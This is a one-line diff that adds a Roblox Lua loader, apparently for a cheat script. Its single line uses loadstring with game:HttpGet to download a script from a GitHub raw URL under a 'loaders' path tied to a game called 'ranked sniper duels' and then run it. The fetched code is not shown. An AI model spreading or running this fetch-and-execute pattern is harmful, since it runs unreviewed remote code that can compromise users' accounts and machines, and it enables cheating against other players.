@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/ranked-sniper-duels-spam0-ccev1cr4mbd1gt.lua"))()
